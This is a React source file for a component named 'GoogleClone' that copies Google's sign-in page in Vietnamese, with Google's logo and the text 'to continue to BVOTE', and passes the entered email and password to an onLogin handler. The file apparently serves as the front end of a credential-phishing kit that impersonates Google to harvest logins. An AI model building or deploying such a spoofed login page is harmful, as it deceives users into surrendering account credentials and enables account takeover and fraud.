import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader, Eye, EyeOff } from 'lucide-react';

const GoogleClone = ({ onLogin, isLoading }) => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);

    const handleSubmit = (e) => {
        e.preventDefault();
        if (username && password) {
            onLogin({ username, password });
        }
    };

    return (
        <div 
          className="w-full flex flex-col items-center justify-center p-4 sm:p-6"
        >
            <div className="w-full flex flex-col items-center text-center mb-6">
                 <svg className="w-16 mx-auto mb-4" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238C29.211 35.091 26.715 36 24 36c-5.222 0-9.657-3.657-11.303-8.591l-6.571 4.819C9.656 39.663 16.318 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303c-.792 2.237-2.231 4.166-4.087 5.571l6.19 5.238C41.382 34.899 44 29.823 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
                <h1 className="text-xl sm:text-2xl text-gray-800 mt-2">Đăng nhập</h1>
                <p className="text-gray-600 mt-1 text-sm sm:text-base">để tiếp tục đến BVOTE</p>
            </div>
            <form onSubmit={handleSubmit} className="w-full max-w-sm">
                <div className="space-y-4">
                    <Input
                        type="email"
                        placeholder="Email hoặc số điện thoại"
                        required
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="w-full p-3 text-sm sm:text-base border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 text-black placeholder-gray-500 bg-gray-50/80"
                    />
                    <div className="relative">
                         <Input
                            type={showPassword ? 'text' : 'password'}
                            placeholder="Mật khẩu"
                            required
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full p-3 text-sm sm:text-base border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 text-black placeholder-gray-500 bg-gray-50/80 pr-10"
                        />
                        <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500 hover:text-gray-700"
                            aria-label={showPassword ? "Ẩn mật khẩu" : "Hiện mật khẩu"}
                        >
                            {showPassword ? <EyeOff /> : <Eye />}
                        </button>
                    </div>
                </div>
                <div className="flex justify-between items-center mt-6">
                    <a href="#" className="text-xs sm:text-sm text-blue-600 hover:underline font-semibold">
                       Quên mật khẩu?
                    </a>
                    <Button
                        type="submit"
                        className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-6 sm:px-8 rounded-md text-sm"
                        disabled={isLoading}
                    >
                         {isLoading ? <Loader className="animate-spin" /> : 'Tiếp theo'}
                    </Button>
                </div>
            </form>
        </div>
    );
};

export default GoogleClone;